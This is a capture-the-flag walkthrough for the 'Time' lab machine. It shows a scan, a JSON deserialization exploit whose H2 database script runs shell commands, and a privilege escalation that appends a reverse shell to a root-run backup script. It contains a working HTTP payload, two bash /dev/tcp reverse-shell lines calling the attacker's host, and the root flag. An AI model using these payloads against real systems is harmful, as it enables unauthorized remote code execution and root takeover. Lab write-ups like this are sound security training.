## Time

__Machine IP: 10.10.10.214__
__Difficulty: Easy__

## Scanning

### Nmap scanning

```bash
$ nmap -sC -sV  -oN nmap/time  10.10.10.214
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 04:13 EDT
Nmap scan report for 10.10.10.214
Host is up (0.095s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds
```


## Enumeration

- Home page

![homepage](images/homepage.PNG)


- on entering wrong input it threw an error
```bash
Validation failed: "ch.qos.logback.core.db.DriverManagerConnectionSource",
```

- on quick serach found an `RCE` based on deserialiaztion

![cve_github](images/cve_github.PNG)


## Exploitation 
- Downlaod the `Github files` 
- modified inject.sql into following

```bash
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.12/9001 0>&1')
```

- Now start the python server
- And now setup the listener and  make the request with following payload.

```php
POST / HTTP/1.1
Host: 10.10.10.214
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Origin: http://10.10.10.214
Connection: close
Referer: http://10.10.10.214/
Upgrade-Insecure-Requests: 1

mode=2&data=[
"ch.qos.logback.core.db.DriverManagerConnectionSource",{
"url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.12:80\/inject.sql'"
}]
```

> Make sure to escape '/' otherwise it does'nt execute

__Result__

```bash
$ nc -lvnp  9001
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.214] 35526
bash: cannot set terminal process group (931): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ whoami
whoami
pericles
pericles@time:/var/www/html$ 
```

## Privilege escalation

- on running `linpeas` found a script, that can be modifiable by our user

![linpeas](images/linpeas.PNG)

```bash
pericles@time:/var/www/html$ cat /usr/bin/timer_backup.sh
cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

- Modified script

```bash
pericles@time:/usr/bin$ echo 'bash -i >& /dev/tcp/10.10.14.12/4242 0>&1' >> timer_backup.sh
< /dev/tcp/10.10.14.12/4242 0>&1' >> timer_backup.sh
pericles@time:/usr/bin$ cat timer_backup.sh
cat timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
bash -i >& /dev/tcp/10.10.14.12/4242 0>&1
pericles@time:/usr/bin$ 
```

__Result__

```bash
─$ nc -lvnp  4242
listening on [any] 4242 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.214] 56054
bash: cannot set terminal process group (42617): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/# cat /root/root.txt
cat /root/root.txt
ef1e7f326561ede1666fe3781ae00ece
root@time:/# exit
```

> Shell exits in few seconds make sure to run netcat and connect to another session
